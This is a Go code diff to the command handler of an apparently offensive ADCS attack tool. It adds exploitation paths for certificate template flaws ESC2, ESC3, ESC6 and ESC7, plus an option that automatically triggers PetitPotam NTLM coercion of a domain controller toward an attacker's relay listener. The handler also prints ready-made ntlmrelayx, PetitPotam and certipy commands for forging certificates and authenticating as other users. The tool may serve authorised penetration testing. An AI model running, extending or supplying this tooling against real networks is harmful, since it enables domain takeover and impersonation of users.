@@ -463,8 +463,20 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	switch strings.ToLower(exploit) {
 	case "esc1":
 		cert, certKey, err = pki.ExploitESC1(cfg, templateName, upn)
+	case "esc2":
+		cert, certKey, err = pki.ExploitESC2(cfg, templateName, upn)
+	case "esc3":
+		cert, certKey, err = pki.ExploitESC3(cfg, templateName, upn)
 	case "esc4":
 		cert, certKey, err = pki.ExploitESC4(cfg, templateName, upn)
+	case "esc6":
+		cert, certKey, err = pki.ExploitESC6(cfg, templateName, upn)
+	case "esc7":
+		caName, _ := cmd.Flags().GetString("ca")
+		if caName == "" {
+			return fmt.Errorf("--ca is required for ESC7 exploitation (target CA name)")
+		}
+		cert, certKey, err = pki.ExploitESC7(cfg, caName, upn)
 	case "esc9":
 		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
 		if attackerDN == "" {
@@ -486,7 +498,18 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		for _, f := range esc8Findings {
 			fmt.Printf("\n    Target: %s (%s)\n", f.CAName, f.CAHostname)
 			fmt.Printf("    ntlmrelayx.py -t %scertfnsh.asp -smb2support --adcs --template %s\n", f.HTTPEndpoint, templateName)
-			fmt.Printf("    # Then coerce auth: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
+		}
+		// If --listener-ip is set, trigger PetitPotam coercion automatically
+		listenerIP, _ := cmd.Flags().GetString("listener-ip")
+		if listenerIP != "" {
+			fmt.Printf("\n[*] Triggering PetitPotam coercion: %s → %s\n", cfg.TargetDC, listenerIP)
+			if coerceErr := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, pki.CoercePetitPotam); coerceErr != nil {
+				fmt.Printf("[!] PetitPotam coercion failed: %v\n", coerceErr)
+				fmt.Printf("[*] Manual: PetitPotam.py %s %s\n", listenerIP, cfg.TargetDC)
+			}
+		} else {
+			fmt.Printf("\n[*] To auto-trigger coercion, add: --listener-ip <YOUR_RELAY_IP>\n")
+			fmt.Printf("[*] Or manually: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
 		}
 		fmt.Println("\n[*] After obtaining the certificate via relay:")
 		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
@@ -511,7 +534,7 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		fmt.Printf("    certipy auth -pfx <cert.pfx> -dc-ip %s\n", cfg.TargetDC)
 		return nil
 	default:
-		return fmt.Errorf("unsupported exploit: %s (supported: esc1, esc4, esc8, esc9, esc12, esc13)", exploit)
+		return fmt.Errorf("unsupported exploit: %s (supported: esc1, esc2, esc3, esc4, esc6, esc7, esc8, esc9, esc12, esc13)", exploit)
 	}
 
 	if err != nil {
@@ -657,7 +680,7 @@ func init() {
 	// Action flags
 	pkiCmd.Flags().Bool("enum", false, "Enumerate ADCS certificate templates")
 	pkiCmd.Flags().Bool("forge", false, "Forge a golden certificate")
-	pkiCmd.Flags().String("exploit", "", "Exploit ESC vulnerability (esc1, esc4, esc8, esc9, esc12, esc13)")
+	pkiCmd.Flags().String("exploit", "", "Exploit ESC vulnerability (esc1, esc2, esc3, esc4, esc6, esc7, esc8, esc9, esc12, esc13)")
 	pkiCmd.Flags().Bool("auto-detect", false, "Auto-detect ESC vulnerabilities and prioritize attack paths")
 	pkiCmd.Flags().String("import-pfx", "", "Import and display info from a PKCS12/PFX file")
 	pkiCmd.Flags().Bool("report", false, "Generate engagement report from full ADCS enumeration")
@@ -679,7 +702,9 @@ func init() {
 	pkiCmd.Flags().String("ca-cert", "", "Path to CA certificate PEM file (with --ca-key, enables golden certificate mode)")
 	pkiCmd.Flags().String("template", "", "Certificate template name for exploitation")
 	pkiCmd.Flags().String("pfx-password", "", "Password for PFX archive (default: empty/unencrypted)")
+	pkiCmd.Flags().String("ca", "", "Target CA name for ESC7 exploitation")
 	pkiCmd.Flags().String("attacker-dn", "", "Attacker's LDAP DN for ESC9 exploitation (e.g., CN=attacker,CN=Users,DC=corp,DC=local)")
+	pkiCmd.Flags().String("listener-ip", "", "Attacker relay listener IP for ESC8/ESC11 (triggers PetitPotam coercion automatically)")
 
 	// Output flags
 	pkiCmd.Flags().StringP("output", "o", "", "Output file path")
